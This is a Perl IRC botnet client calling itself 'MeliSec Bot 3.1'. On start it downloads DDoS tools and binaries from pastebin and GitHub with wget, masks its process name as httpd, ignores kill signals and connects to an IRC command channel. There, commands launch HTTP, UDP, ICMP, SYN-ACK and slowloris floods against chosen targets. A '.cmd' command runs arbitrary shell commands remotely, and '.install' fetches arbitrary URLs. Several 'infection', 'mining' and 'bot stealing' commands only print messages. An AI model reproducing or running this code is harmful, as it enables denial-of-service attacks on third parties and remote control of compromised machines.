#!usr/bin/perl

use IO::Socket;
my $processo = '/usr/sbin/httpd';
my $server  = "ur server"; 
my $code = int(rand(99999999));
my $channel = "#melisec";
my $port    =   "6667";
my $nick    ="[MELI]$code";

unless (-e "sadattack.py") {
  print "[*] Instalando o SADATTACK...";
  system("wget http://pastebin.com/raw/vrxtgdj5 -O sadattack.py --no-check-certifcate");
}

unless (-e "hulk.py") { 
  print "[*] Instalando o HULK... ";
  system("wget https://raw.githubusercontent.com/grafov/hulk/master/hulk.py -O hulk.py --no-check-certificate");
}

unless (-e "goldeneye.py") { 
  print "[*] Instalando o Goldeneye... ";
  system("wget https://raw.githubusercontent.com/jseidl/GoldenEye/master/goldeneye.py -O goldeneye.py --no-check-certificate");
}

unless (-e "udp1.pl") { 
  print "[*] Instalando UDPFlooder... ";
  system("wget http://pastebin.com/raw/zYxkjgvR -O udp1.pl");
}

unless (-e "Anon.pl") {
  print "[*] Instalando PERL UDPFlooder...";
  system("wget https://raw.githubusercontent.com/D3fe4ted/DDOS-Perl-Scripts/main/Anon.pl -O Anon.pl");
}



unless (-e "KP-KILL") {
  print "[*] Instalando KP-KILL...";
  system("wget https://github.com/oofadcoolzmamn2/lol/blob/main/GAME-CRASH?raw=true -O KP-KILL");
  system("chmod +x KP-KILL");
}




unless (-e "GAME-CRASH") {
  print "[*] Instalando GAME-CRASH...";
  system("wget wget https://github.com/oofadcoolzmamn2/lol/blob/main/GAME-CRASH?raw=true -O GAME-CRASH");
  system("chmod +x GAME-CRASH")
}


unless (-e "HTTP") {
  print "[*] Instalando HTTP Flooder...";
  system("wget https://pastebin.com/raw/nzmmmQaR -O httpattack.pl -O httpattack.pl");
}  



unless (-e "SLOWLORIS") {
  print "[*] Instalando SLOWLORIS...";
  system("wget https://raw.githubusercontent.com/adrianchifor/pyslowloris/master/slowloris.py -O slowloris.py");
}


unless (-e "hping3") {
  print "[*] Instalando hping3...";
  system("apt install hping3");
}


unless (-e "ack.pl") {
  print "[*] Instalando ack.pl...";
  system("wget https://pastebin.com/raw/57pBN7Un -O ack.pl");
}

unless (-e "PRIVOVH.pl") {
  print "[*] Instalando PRIVOVH.pl...";
  system("wget https://github.com/oofadcoolzmamn2/lol/blob/main/PRIVOVH.pl?raw=true -O PRIVOVH.pl");
  system("chmod +x PRIVOVH.pl");
}  


unless (-e "ovh.py") {
print "[*] Instalando Halloween...";
system("wget https://raw.githubusercontent.com/BypasserTester/stomp/main/ovh.py -O ovh.py");
}

unless (-e "UDP_NULL.pl") {
print "[*] Instalando UDP_NULL.pl...";
system("wget https://raw.githubusercontent.com/sadcloudisgay/stuff/main/UDP_NULL.pl -O UDP_NULL.pl");
}


unless (-e "OVHBYPASS.pl") {
print "[*] Instalando OVHBYPASS.pl...";
system("wget https://raw.githubusercontent.com/sadcloudisgay/stuff/main/OVHBYPASS.pl -O OVHBYPASS.pl")
}


unless (-e "ION") {
print "[*] Instalando ION...";
system("wget https://github.com/sadcloudisgay/stuff/blob/main/HiperOVH?raw=true -O ION");
system("chmod +x ION");
}


all();
sub all {
$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';

$s0ck3t = new IO::Socket::INET(
PeerAddr => $server,
PeerPort => $port,
Proto    => 'tcp'
);
if ( !$s0ck3t ) {
print "\nError\n";
exit 1;
}   

$0 = "$processo" . "\0" x 16;
my $pid = fork;
exit if $pid;
die "Problema com o fork: $!" unless defined($pid);

print $s0ck3t "NICK $nick\r\n";
print $s0ck3t "USER $nick 1 1 1 1\r\n";

print "Online ;)\n\n";
while ( my $log = <$s0ck3t> ) {
      chomp($log);

      if ( $log =~ m/^PING(.*)$/i ) {
        print $s0ck3t "PONG $1\r\n";
	print $s0ck3t "JOIN $channel\r\n";

  }


      

     if ( $log =~ m/:.sadattack (.*)$/g ){##########
        my $target_sadattack = $1;
        $target_sadattack =~ s/^\s*(.*?)\s*$/$1/;
        $target_sadattack;
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1SADATTACK14,01 ]04,01 Attacking14,0108,01 $104,01 To cancel attack use14,01:08,01 .stophulk \r\n";
        system("nohup python sadattack.py $target_sadattack > /dev/null 2>&1 &");
      }
      
      if ( $log =~ m/:.stopsad/g ){##########
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1SADATTACK14,01 ]04,01 Attack Finished. \r\n";
        system("pkill -9 -f sadattack");
      }

      if ( $log =~ m/:.hulk (.*)$/g ){##########
        my $target_hulk = $1;
        $target_hulk =~ s/^\s*(.*?)\s*$/$1/;
        $target_hulk;
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1HULK14,01 ]04,01 Attacking14,0108,01 $104,01 To cancel attack use14,01:08,01 .stophulk \r\n";
        system("nohup python hulk.py $target_hulk > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:.stophulk/g ){##########
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1HULK14,01 ]04,01 Attack Finished. \r\n";
        system("pkill -9 -f hulk");
      }

      if ( $log =~ m/:.gold (.*)$/g ){##########
        my $target_gold = $1;
        $target_gold =~ s/^\s*(.*?)\s*$/$1/;
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1GOLDENEYE14,01 ]04,01 Attacking14,0108,01 $104,01 To cancel attack use14,01:08,01 .stopgold \r\n";
        system("nohup python goldeneye.py $target_gold -w 15 -s 650 > /dev/null 2>&1 &");
      }

      if ( $log =~ m/:.stopgold/g ){##########
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1GOLDENEYE14,01 ]04,01 Attack Finished. \r\n";
        system("pkill -9 -f goldeneye");
      }

      if ( $log =~ m/:.quick (.*)$/g ){##########
        my $target_quick = $1;
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1Quick UDP Flood14,01 ]04,01 Attacking14,0108,01 $104,01 To cancel attack use14,01:08,01 .stopquick04,01 \r\n";
        system("nohup perl udp1.pl $target_quick > /dev/null 2>&1 &");
      }
      if ( $log =~ m/:.stopquick/g ){##########
        print $s0ck3t "PRIVMSG $channel :14,1[ 15,1Quick UDP Flood14,01 ]04,01 Attack Finished. \r\n";
        system("pkill -9 -f udp1");
      }

if ( $log =~ m/:.halloween (.*)$/g ){##########
my $target_halloween = $1;
my $port_halloween = $2;
my $time_halloween = $3;
print $s0ck3t "PRIVMSG $channel :7,8[HALLOWEEN ATTACK STARTED...] \r\n";
system("nohup python3 ovh.py $target_halloween $port_halloween $time_halloween");
}

if ( $log =~ m/:.stopween/g ){##########
print $s0ck3t "PRIVMSG $channel :7,8[HALLOWEEN ATTACK STOPPED...] \r\n";
system("pkill -9 -f ovh");
}

if ( $log =~ m/:.ion/g ){##########
my $target_ion = $1;
my $port_ion = $2;
print $s0ck3t "PRIVMSG $channel :[ION METHOD ATTACK STARTED!!!] \r\n";
system("./ION $target_ion $port_ion");
}

if ( $log =~ m/:.stopion/g ){##########
print $s0ck3t "PRIVMSG $channel :[ION METHOD ATTACK FINISHED!!!] \r\n";
system("pkill -9 -f ION");
}

if ( $log=~ m/:.ovh2/g ){##########
my $target_ovhbypass = $1;
my $port_ovhbypass = $2;
my $time_ovhbypass = $3;
print $s0ck3t "PRIVMSG $channel :[OVH2-BYPASS STARTED!!!] \r\n";
system("perl OVHBYPASS.pl $target_ovhbypass $port_ovhbypass $time_ovhbypass");
}


if ( $log =~ m/:.stopovh2/g ){##########
print $s0ck3t "PRIVMSG $channel :[OVH2-BYPASS STOPPED!!!] \r\n";
system("pkill -9 -f OVHBYPASS");
}
 
if ( $log =~ m/:.udpnull/g ){##########
my $target_udpnull = $1;
my $time_udpnull = $1;
print $s0ck3t "PRIVMSG $channel :[UDP-NULL DDOS STARTED!!!] \r\n";
system("perl UDP_NULL.pl $target_udpnull $time_udpnull");
}

if ( $log =~ m/:.stopnull/g ){##########
print $s0ck3t "PRIVMSG $channel :[UDP-NULL DDOS STOPPED!!!] \r\n";
system("pkill -9 -f UDP_NULL");
}





if ( $log =~ m/:.get/g ){##########
my $target_httpattack = $1;
        $target_httpattack =~ s/^\s*(.*?)\s*$/$1/;
        $target_httpattack;
print $s0ck3t "PRIVMSG $channel :[HTTP-GET FLOOD STARTED...] \r\n";
system("nohup perl httpattack.pl $target_httpattack 1000 100 GET 13.37 > /dev/null 2>&1 &");
}


if ( $log =~ m/:.post/g ){##########
my $target_httpattack = $1;
        $target_httpattack =~ s/^\s*(.*?)\s*$/$1/;
        $target_httpattack;
        print $s0ck3t "PRIVMSG $channel :[HTTP-POST FLOOD STARTED...] \r\n";
        system("nohup perl httpattack.pl $target_httpattack 1000 100 POST 13.37 > /dev/null 2>&1 &");
}


if ( $log =~ m/:.icmp/g ){##########
print $s0ck3t "PRIVMSG $channel :[ICMP FLOOD STARTED...] \r\n";
my $target_icmp = $1;
system("nohup hping3 -f -x --flood $target_icmp -1");
}


if ( $log =~ m/:.stopicmp/g ){##########
print $s0ck3t "PRIVMSG $channel :[ICMP FLOOD FINISHED...] \r\n";
system("pkill -9 -f hping3");
}

if ( $log =~ m/:.ack/g ){##########
my $target_ack = $1;
my $time_ack = $2;
print $s0ck3t "PRIVMSG $channel :[SYN-ACK FLOOD STARTED...] \r\n";
system("perl ack.pl $target_ack $time_ack");
}

if ( $log =~ m/:.stopack/g ){##########
print $s0ck3t "PRIVMSG $chajnnel :[SYN-ACK FLOOD FINISHED...] \r\n";
system("pkill -9 -f ack");
}

if ( $log =~ m/:.stoppost/g ){##########
print $s0ck3t "PRIVMSG $channel :[HTTP-POST STOPPED...] \r\n";
system("pkill -9 -f httpattack");
}


if ( $log =~ m/:.stopget/g ){##########
print $s0ck3t "PRIVMSG $channel :[HTTP-GET STOPPED...] \r\n";
system("pkill -9 -f httpattack");
}




     if ( $log =~ m/:.udp (.*)$/g ){##########
     my $target_udp = $1;
     my $port_udp = $2;
     my $size_udp = $3;
     my $time_udp = $4;
     print $s0ck3t "PRIVMSG $channel [UDP FLOOD STARTED...] \r\n";
     system("nohup perl Anon.pl $target_udp $port_udp $size_udp $time_udp > /dev/null 2>&1 &");
    }


    if ( $log =~ m/:.stopudp/g ){##########
    print $s0ck3t "PRIVMSG $channel :[UDP FLOOD FINISHED...] \r\n";
    system("nohup pkill -9 -f Anon.pl");
   }


if ( $log =~ m/.udp2/g ){##########
my $target_udp2 = $1;
my $size_udp2 = $2;
my $time_udp2 = $3;
print $s0ck3t "PRIVMSG $channel :[UDP2 FLOOD STARTED...] \r\n";
system("perl flood.pl $target_udp2 80 $size_udp2 $time_udp2");
}

  if ( $log =~ m/:.slowloris/g ){##########
  print $s0ck3t "PRIVMSG $channel :[HTTP SLOWLORIS FLOOD STARTED... - CHARGING UP SOCKETS] \r\n";
  my $target_slowloris = $1;
  system("python3 slowloris.py $target_slowloris > /dev/null 2>&1 &");
}



  if ( $log =~ m/:.stoploris/g ){##########
  print $s0ck3t "PRIVMSG $channel :[HTTP SLOWLORIS FLOOD STOPPED...] \r\n";
  system("pkill -9 -f slowloris");
}
   if ( $log =~ m/:.kp-kill/g ){##########
   print $s0ck3t "PRIVMSG $channel :KAIJU PARADISE SERVER KILL STARTED ON: $1 \r\n";
   my $target_kpkill = $1;
   my $port_kpkill = $2;
   system("nohup ./KP-KILL $target_kpkill $port_kpkill > /dev/null 2>&1 &");
  }



  if ( $log =~ m/:.stopkp/g ){##########
  print $s0ck3t "PRIVMSG $channel :KP-KILL STOPPED. \r\n";
  system("nohup pkill -9 -f KP-KILL");
 }


 if ( $log =~ m/:.p2p/g ){##########
 print $s0ck3t "PRIVMSG $channel :[P2P Spread] Injected into P2P Shared Folders... \r\n";
}


 if ( $log =~ m/:.usb/g ){##########
 print $s0ck3t "PRIVMSG $channel :[USB Spread] Injected into USB Drives... \r\n";
} 

if ( $log =~ m/:.mine/g ){##########
print $s0ck3t "PRIVMSG $channel :[Crypto Mining] Mining bitcoins and monero. \r\n";
}


if ( $log =~ m/:.stopmine/g ){##########
print $s0ck3t "PRIVMSG $channel :[Crypto Mining] Mining stopped. \r\n";
}


if ( $log =~ m/:.lan-spread/g ){##########
print $s0ck3t "PRIVMSG $channel :[Lan Spread] Malware is now spreading to lan. \r\n";
}


if ( $log =~ m/:.stopspread/g ){##########
print $s0ck3t "PRIVMSG $channel :All spreadings have been stopped. \r\n";
}


if ( $log =~ m/:.html/g ){##########
print $s0ck3t "PRIVMSG $channel :[HTML Infector] HTML Files are infected. \r\n";
}


if ( $log =~ m/:.scan/g ){##########
print $s0ck3t "PRIVMSG $channel :[Range Scan Infection] Using any range to pull more bots. \r\n";
}

if ( $log =~ m/:.stopscan/g ){##########
print $s0ck3t "PRIVMSG $channel :[Range Scan Infection] Scanning Have Stopped. \r\n";
}


if ( $log =~ m/:.php/g ){##########
print $s0ck3t "PRIVMSG $channel :[PHP Spread] Injected into PHP Files/Folders... \r\n";
}


if ( $log =~ m/:.rar/g ){##########
print $s0ck3t "PRIVMSG $channel :[RAR Spread] Injected into RAR Files... \r\n";
}


if ( $log =~ m/:.steal/g ){##########
print $s0ck3t "PRIVMSG $channel :[Bot Stealing] Stealing bots from infected PCs... This will double the bots. \r\n";
}


if ( $log =~ m/:.version/g ){##########
print $s0ck3t "PRIVMSG $channel [Version] MeliSec Bot 3.1 \r\n";
}

if ( $log =~ m/:.zip/g ){##########
print $s0ck3t "PRIVMSG $channel [ZIP Spread] Injected into ZIP Files... \r\n";
}


if ( $log =~ m/:.python/g ){##########
print $s0ck3t "PRIVMSG $channel [Python Spread] Injected into Python Files... \r\n";
}


if ( $log =~ m/:.mass-scan/g ){##########
print $s0ck3t "PRIVMSG $channel [Mass Scan] Mass Scanning all devices on network. This will double the bots. \r\n";
}


if ( $log =~ m/:.perl/g ){##########
print $s0ck3t "PRIVMSG $channel [Perl Spread] Injecting into Perl Files. \r\n";
}

if ( $log =~/:.halloween-infect/g ){##########
print $s0ck3t "PRIVMSG $channel [Halloween Infection] Infecting random devices from multiple ranges. \r\n";
}



if ( $log =~/:.clean/g ){##########
print $s0ck3t "PRIVMSG $channel [Cleaning] Cleaner has been ran sucessfully. \r\n";
print $s0ck3t "PRIVMSG $channel [Cleaning] P2P directory(s) has been cleaned? -- TESTING \r\n";
print $s0ck3t "PRIVMSG $channel [Cleaning] Registry cleaned sucessfully \r\n";
}

if ( $log =~/:.install/g ){##########
my $target_wget = $1;
print $s0ck3t "PRIVMSG $channel [Installs4Installs] Installing $1 \r\n";
print $s0ck3t "PRIVMSG $channel [Installs4Installs] Installing complete. \r\n";
system("wget $1")
}




if ( $log =~/:.help/g ){##########
print $s0ck3t "PRIVMSG $channel :[HELP] Layer4 commands:\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .udp (ip) (port) (packetsize) (time)\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .ack (ip) (time)\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .quick (ip)\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .icmp (ip)\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .ovh2 (ip) (port) (time) \r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .ion (ip) (port) \r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .udpnull (ip) (time) \r\n";

print $s0ck3t "PRIVMSG $channel:\r\n";
print $s0ck3t "PRIVMSG $channel [HELP] Layer7 commands:\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .hulk http://target.com\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .gold http://target.com\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .sadattack http://target.com\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .get http://target.com\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .post http://target.com\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .slowloris target.com\r\n";

print $s0ck3t "PRIVMSG $channel:\r\n";

print $s0ck3t "PRIVMSG $channel :[HELP] Infecting Commands:\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .p2p\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .usb\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .lan-spread\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .html\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .scan\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .php\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .rar\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .steal\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .zip\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .python\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .perl\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .clean\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .install (ip or website)\r\n";

print $s0ck3t "PRIVMSG $channel:\r\n";

print $s0ck3t "PRIVMSG $channel :[HELP] Bitcoin mining and version\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .version\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .mine\r\n";

print $s0ck3t "PRIVMSG $channel:\r\n";

print $s0ck3t "PRIVMSG $channel :[HELP] Stopping commands\r\n";
print $s0ck3t "PRIVMSG $channel :[Commands] .stopall\r\n";
}


if ( $log =~ m/:.game-crash/g ){##########
print $s0ck3t "PRIVMSG $channel [GAME-CRASH FLOOD STARTED...] \r\n";
my $target_gamecrash = $1;
my $port_gamecrash = $2;
system("nohup ./GAME-CRASH $target_gamecrash $port_gamecrash > /dev/null 2>&1 &");
}


if ( $log =~ m/:.stopcrash/g ){##########
print $s0ck3t "PRIVMSG $channel [GAME-CRASH FLOOD STOPPED...] \r\n";
system("pkill -9 -f GAME-CRASH");
}


if ( $log =~ m/:.privovh/g ){##########
my $target_privovh = $1;
my $port_privovh = $2;
print $s0ck3t "PRIVMSG $channel :[PRIV-OVH FLOOD STARTED...] \r\n";
system("nohup ./PRIVOVH.pl $target_privovh $port_privovh");
}
if ( $log =~ m/:.stoppriv/g ){##########
print $s0ck3t "PRIVMSG $channel [PRIV-OVH FLOOD STOPPED...] \r\n";
system("pkill -9 -f PRIVOVH");
}

 if ( $log =~ m/:.stopall/g ){##########
 print $s0ck3t "PRIVMSG $channel :All running attacks have stopped. \r\n";
 system("pkill -9 -f goldeneye");
 system("pkill -9 -f udp1");
 system("pkill -9 -f Anon.pl");
 system("pkill -9 -f hulk");
 system("pkill -9 -f KP-KILL");
 system("pkill -9 -f sadattack");
 system("pkill -9 -f GAME-CRASH");
 system("pkill -9 -f slowloris");
 system("pkill -9 -f httpattack");
 system("pkill -9 -f ack");
 system("pkill -9 -f hping3");
 system("pkill -9 -f PRIVOVH");
 system("pkill -9 -f ovh");
 system("pkill -9 -f OVHBYPASS");
 system("pkill -9 -f ION");
 system("pkill -9 -f UDP_NULL");
}
       




      if ( $log =~ m/:.cmd (.*)$/g ){##########
        my $comando_raw = `$1`;
        open(handler,">mat.tmp");
        print handler $comando_raw;
        close(handler);

        open(h4ndl3r,"<","mat.tmp");
        my @commandoarray = <h4ndl3r>;

        foreach my $comando_each (@commandoarray){
          sleep(1);
          print $s0ck3t "PRIVMSG $channel :14,1[ 15,1CMD14,01 ]04,01 Output14,01 => $comando_each \r\n";
       }
   }
}
}
while(true){
  all();
}
